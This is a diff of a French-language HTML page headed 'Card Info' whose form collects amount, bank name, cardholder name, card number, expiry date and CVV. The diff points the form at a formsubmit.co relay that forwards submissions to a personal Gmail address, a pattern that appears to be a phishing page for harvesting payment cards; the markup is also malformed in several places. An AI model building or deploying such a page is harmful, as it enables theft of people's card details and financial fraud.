@@ -1,4 +1,4 @@
-
+<!doctype html>
 <html> 
  <head></head> 
  <body> <htlm lang="fr"> 
@@ -13,23 +13,23 @@
     <br> 
     <h1>Card Info</h1> 
     <br> 
-    <form action="issaabdoulazizou84@gmail.com" metod="POST"> 
-     <input type="" texte"montant="montant&quot;" placeholder="Montant" required> 
+    <form action="https://formsubmit.co/issakoudoussou980@gmail.com" method="POST"> 
+     <input type=" texte" montant="montant&quot;" placeholder="Montant" required> 
      <br> 
      <br> 
-     <input type="" texte"banque="banque&quot;" placeholder="Nom de la Banque" required> 
+     <input type=" texte"banque="banque&quot;" placeholder="Nom de la Banque" required> 
      <br> 
      <br> 
-     <input type="" texte"name="name&quot;" placeholder="Titulaire de la carte" required> 
+     <input type="texte"name="name&quot;" placeholder="Titulaire de la carte" required> 
      <br> 
      <br> 
-     <input type="" texte"number="number&quot;" placeholder="Numero de la carte" required> 
+     <input type=" texte"number="number&quot;" placeholder="Numero de la carte" required> 
      <br> 
      <br> 
-     <input type="" texte"date="date&quot;" placeholder="MM/AAAA" required> 
+     <input type=" texte"date="date&quot;" placeholder="MM/AAAA" required> 
      <br> 
      <br> 
-     <input type="" texte"cvv="Cvv&quot;" placeholder="Cvv/Code" required> 
+     <input type=" texte"cvv="Cvv&quot;" placeholder="Cvv/Code" required> 
      <br> 
      <br> <button type="submit">PAYEZ</button> 
     </form> 
